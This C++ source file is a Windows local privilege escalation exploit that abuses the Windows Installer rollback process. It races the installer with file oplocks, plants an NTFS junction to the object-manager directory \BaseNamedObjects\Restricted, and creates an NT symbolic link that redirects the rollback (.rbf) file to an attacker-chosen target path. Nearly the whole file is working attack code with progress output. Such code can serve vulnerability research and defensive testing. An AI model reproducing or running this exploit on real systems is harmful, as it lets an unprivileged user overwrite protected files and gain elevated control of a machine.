#include "exploit.h"

#include <Windows.h>
#include <shlwapi.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <winternl.h>
#include <sddl.h>

#include "winglue.h"
#include "FileOpLock.h"

namespace
{
    NTSTATUS(WINAPI* _NtCreateSymbolicLinkObject)(
        OUT PHANDLE             pHandle,
        IN ACCESS_MASK          DesiredAccess,
        IN POBJECT_ATTRIBUTES   ObjectAttributes,
        IN PUNICODE_STRING      DestinationName);

    Exploit* s_current = NULL;
    void callback_one_callthrough()
    {
        s_current->callback_one();
    }

    void callback_two_callthrough()
    {
        s_current->callback_two();
    }

    bool MoveByHandle(HANDLE hfile, std::wstring& target)
    {
        size_t destFilenameLength = target.size();
        size_t bufferSize = sizeof(FILE_RENAME_INFO) + (destFilenameLength * sizeof(wchar_t));
        void* buffer = _malloca(bufferSize);
        memset(buffer, 0, bufferSize);
        FILE_RENAME_INFO* rename_info = reinterpret_cast<FILE_RENAME_INFO*>(buffer);
        rename_info->FileNameLength = destFilenameLength;
        rename_info->ReplaceIfExists = TRUE;
        rename_info->RootDirectory = NULL;
        wmemcpy(rename_info->FileName, target.c_str(), destFilenameLength);
        if (SetFileInformationByHandle(hfile, FileRenameInfo, rename_info, bufferSize) == 0)
        {
            std::wcout << "[!] Failed to move to " << target << std::endl;
            return false;
        }
        return true;
    }

    WCHAR* GetRbfFile(HANDLE hdir) {
        FILE_NOTIFY_INFORMATION* fn;
        static char buf[4096] = { 0 };
        do {
            DWORD ret_sz = 0;
            ReadDirectoryChangesW(hdir, buf, 4096, TRUE, FILE_NOTIFY_CHANGE_FILE_NAME, &ret_sz, NULL, NULL);
            fn = (FILE_NOTIFY_INFORMATION*)buf;
            if (fn->Action != FILE_ACTION_REMOVED)
                continue;
            size_t sz = fn->FileNameLength / sizeof(WCHAR);
            fn->FileName[sz] = '\0';
        } while (wcscmp(PathFindExtension(fn->FileName), L".rbf") != 0);
        return fn->FileName;
    }
}

Exploit::Exploit(const std::string& p_msi_path, const std::string& p_target_path, const std::string& p_install_path) :
    m_msi_path(p_msi_path),
    m_target_path(p_target_path),
    m_tmp_base_path(p_install_path),
    m_cb_directory(m_tmp_base_path + "cb_directory"),
    m_cb_directory_handle(INVALID_HANDLE_VALUE),
    m_tmp_inner_path("shakeitoff"),
    m_tmp_inner_tmp(m_tmp_base_path + "weird_directory"),
    m_tmp_outter_file("TaylorSwiftShakeItOff1.jpg"),
    m_tmp_lock_file("haters.jpg"),
    m_rbf_path(m_tmp_base_path + m_tmp_inner_path + "\\"),
    m_rbf_name(),
    m_rbf_handle(INVALID_HANDLE_VALUE),
    m_lock_handle(INVALID_HANDLE_VALUE),
    m_inner_shake_directory_handle(INVALID_HANDLE_VALUE)
{
    s_current = this;
}

Exploit::~Exploit()
{
}

void Exploit::load_ntdll()
{
    LoadLibrary(L"ntdll.dll");
    HMODULE hm = GetModuleHandle(L"ntdll.dll");
    _NtCreateSymbolicLinkObject = (NTSTATUS(WINAPI*)(
        OUT PHANDLE             pHandle,
        IN ACCESS_MASK          DesiredAccess,
        IN POBJECT_ATTRIBUTES   ObjectAttributes,
        IN PUNICODE_STRING      DestinationName)) GetProcAddress(hm, "NtCreateSymbolicLinkObject");
}

void Exploit::callback_one()
{
    std::cout << "[+] In callback for oplock one" << std::endl;
    std::cout << "[+] Opening handle to " << m_rbf_path << std::endl;
    m_rbf_handle = CreateFileA(m_rbf_path.c_str(), GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE, FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE, 0, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_FLAG_BACKUP_SEMANTICS, 0);
    if (m_rbf_handle == INVALID_HANDLE_VALUE)
    {
        std::cerr << "[-] Failed to get a handle to the rbf file" << std::endl;
        return;
    }

    std::cout << "[+] Creating the callback directory at " << m_cb_directory << std::endl;
    CreateDirectoryA(m_cb_directory.c_str(), NULL);
    
    std::cout << "[+] Grab a handle for the callback directry" << std::endl;
    m_cb_directory_handle = CreateFileA(m_cb_directory.c_str(), GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE, 0, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_FLAG_BACKUP_SEMANTICS, 0);

    std::cout << "[+] Creating a junction from " << m_cb_directory << " to " << "\\BaseNamedObjects\\Restricted" << std::endl;
    std::wstring target(L"\\BaseNamedObjects\\Restricted");
    std::wstring printname;
    size_t targetsz = target.size() * 2;
    size_t printnamesz = printname.size() * 2;
    size_t pathbuffersz = targetsz + printnamesz + 12;
    size_t totalsz = pathbuffersz + REPARSE_DATA_BUFFER_HEADER_LENGTH;
    REPARSE_DATA_BUFFER* rdb = (REPARSE_DATA_BUFFER*)_malloca(totalsz);
    memset(rdb, 0, totalsz);
    rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    rdb->ReparseDataLength = static_cast<USHORT>(pathbuffersz);
    rdb->Reserved = NULL;
    rdb->MountPointReparseBuffer.SubstituteNameOffset = NULL;
    rdb->MountPointReparseBuffer.SubstituteNameLength = static_cast<USHORT>(targetsz);
    memcpy(rdb->MountPointReparseBuffer.PathBuffer, target.c_str(), targetsz + 2);
    rdb->MountPointReparseBuffer.PrintNameOffset = static_cast<USHORT>(targetsz + 2);
    rdb->MountPointReparseBuffer.PrintNameLength = static_cast<USHORT>(printnamesz);
    memcpy(rdb->MountPointReparseBuffer.PathBuffer + target.size() + 1, printname.c_str(), printnamesz + 2);
    DWORD cb = 0;
    OVERLAPPED ov = { 0 };
    HANDLE hevent = CreateEvent(NULL, FALSE, FALSE, NULL);
    ov.hEvent = hevent;
    BOOL ret = DeviceIoControl(m_cb_directory_handle, FSCTL_SET_REPARSE_POINT, rdb, totalsz, NULL, NULL, NULL, &ov);
    WaitForSingleObject(hevent, INFINITE);
    CloseHandle(hevent);
}

void Exploit::callback_two()
{
    std::cout << "[+] Inside callback two" << std::endl;
    std::cout << "[+] Release the hater.jpg handle to unlock" << std::endl;
    CloseHandle(m_lock_handle);

    std::cout << "[+] Move the rbf file to " << m_tmp_inner_tmp << std::endl;
    std::string rbf_move(m_tmp_inner_tmp + "\\lol");
    std::wstring wrbf_move(rbf_move.begin(), rbf_move.end());
    MoveByHandle(m_rbf_handle, wrbf_move);

    std::cout << "[+] Move inner shakeitoff to " << m_tmp_inner_tmp << std::endl;
    std::string directory_move(m_tmp_inner_tmp + "\\lol1");
    std::wstring wdirectory_move(directory_move.begin(), directory_move.end());
    MoveByHandle(m_inner_shake_directory_handle, wdirectory_move);
    CloseHandle(m_inner_shake_directory_handle);
    m_inner_shake_directory_handle = INVALID_HANDLE_VALUE;

    std::cout << "[+] Move junction at " << m_cb_directory << " to " << m_tmp_base_path << m_tmp_inner_path << std::endl;
    std::string overwrite(m_tmp_base_path + m_tmp_inner_path);
    std::wstring woverwrite(overwrite.begin(), overwrite.end());
    MoveByHandle(m_cb_directory_handle, woverwrite);
    CloseHandle(m_cb_directory_handle);
    m_cb_directory_handle = INVALID_HANDLE_VALUE;

    std::cout << "[+] Configuring symlink from \\BaseNamedObjects\\Restricted\\" + m_rbf_name << " to " << m_target_path << std::endl;
    std::wstring wtarget(m_target_path.begin(), m_target_path.end());
    std::wstring wlink(L"\\BaseNamedObjects\\Restricted\\");
    wlink.append(m_rbf_name.begin(), m_rbf_name.end());

    HANDLE ret;
    UNICODE_STRING ulnk;
    UNICODE_STRING utarget;
    NTSTATUS status;
    RtlInitUnicodeString(&ulnk, wlink.c_str());
    RtlInitUnicodeString(&utarget, wtarget.c_str());

    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;

    OBJECT_ATTRIBUTES objattr;
    objattr.Length = sizeof(OBJECT_ATTRIBUTES);
    objattr.RootDirectory = NULL;
    objattr.Attributes = OBJ_CASE_INSENSITIVE;
    objattr.ObjectName = &ulnk;
    objattr.SecurityDescriptor = NULL;
    objattr.SecurityQualityOfService = NULL;
    NTSTATUS stat = _NtCreateSymbolicLinkObject(&ret, MAXIMUM_ALLOWED, &objattr, &utarget);
    if (stat == 0)
    {
        std::cout << "[+] symlink created!" << std::endl;
    }
    else
    {
        std::cout << "[-] symlink creation failed" << std::endl;
    }
}

void Exploit::exploit_thread()
{
    std::cout << "[+] Grabbing handle to lock " << m_tmp_base_path + m_tmp_inner_path + "\\" + m_tmp_lock_file << std::endl;
    m_lock_handle = CreateFileA((m_tmp_base_path + m_tmp_inner_path + "\\" + m_tmp_lock_file).c_str(), GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE, FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE, 0, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_FLAG_BACKUP_SEMANTICS, 0);
    if (m_lock_handle == INVALID_HANDLE_VALUE)
    {
        std::cerr << "[-] Failed to get a handle to the rbf file" << std::endl;
        return;
    }

    std::cout << "[+] Grabbing a directory handle of " << m_tmp_base_path + m_tmp_inner_path + "\\" << std::endl;
    HANDLE shake_handle = CreateFileA((m_tmp_base_path + m_tmp_inner_path + "\\").c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (shake_handle == INVALID_HANDLE_VALUE)
    {
        std::cout << "[-] Failed to grab a file handle to shakeitoff\\shakeitoff" << std::endl;
        return;
    }

    std::cout << "[+] Monitor shakeitoff\\shakeitoff for an rbf file" << std::endl;
    WCHAR fst[MAX_PATH] = { 0 };
    WCHAR global_fnr[MAX_PATH] = { 0 };
    wcscpy_s(fst, GetRbfFile(shake_handle));
    do {
        wcscpy_s(global_fnr, GetRbfFile(shake_handle));
    } while (wcscmp(fst, global_fnr) == 0);
    CloseHandle(shake_handle);

    std::wstring wfilename(global_fnr);
    m_rbf_name.assign(wfilename.begin(), wfilename.end());
    m_rbf_path.append(m_rbf_name);

    // sync on finish
    HANDLE test;
    do {
        test = CreateFileA(m_rbf_path.c_str(), GENERIC_READ, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    } while (!test);
    CloseHandle(test);

    std::cout << "[+] Grabbing a handle to inner shakeitoff directory" << std::endl;
    m_inner_shake_directory_handle = CreateFileA((m_tmp_base_path + m_tmp_inner_path).c_str(), GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE, 0, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_FLAG_BACKUP_SEMANTICS, 0);
    if (m_inner_shake_directory_handle == INVALID_HANDLE_VALUE)
    {
        std::cout << "[-] Failed to grab a handle to the inner shakeitoff" << std::endl;
        return;
    }

    HANDLE teeswift = CreateFileA((m_tmp_base_path + m_tmp_outter_file).c_str(), GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE, 0, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_FLAG_BACKUP_SEMANTICS, 0);
    if (teeswift == INVALID_HANDLE_VALUE)
    {
        std::cerr << "[-] Failed to get a handle to the teeswift file" << std::endl;
        return;
    }

    FileOpLock* ret = FileOpLock::CreateLock(L"", callback_one_callthrough, teeswift);
    if (ret == NULL)
    {
        std::cout << "[-] Failed to grab tee swift lock" << std::endl;
        return;
    }
    ret->WaitForLock(INFINITE);

    std::wstring wrbf(m_rbf_path.begin(), m_rbf_path.end());
    ret = FileOpLock::CreateLock(wrbf, callback_two_callthrough, m_rbf_handle);
    if (ret == NULL)
    {
        std::cout << "[-] Failed to grab rbf lock" << std::endl;
        return;
    }
    ret->WaitForLock(INFINITE);
}

bool Exploit::create_temp_files()
{
    std::cout << "[+] Create the temp directory structure we'll install into" << std::endl;
    if (!std::filesystem::create_directories(m_tmp_base_path + m_tmp_inner_path))
    {
        return false;
    }

    if (!std::filesystem::create_directories(m_tmp_inner_tmp))
    {
        return false;
    }

    std::ofstream teeswift(m_tmp_base_path + m_tmp_outter_file);
    if (!teeswift.is_open())
    {
        return false;
    }
    teeswift.close();

    std::ofstream haters(m_tmp_base_path + m_tmp_inner_path + "\\" + m_tmp_lock_file);
    if (!haters.is_open())
    {
        return false;
    }
    haters.close();
    return true;
}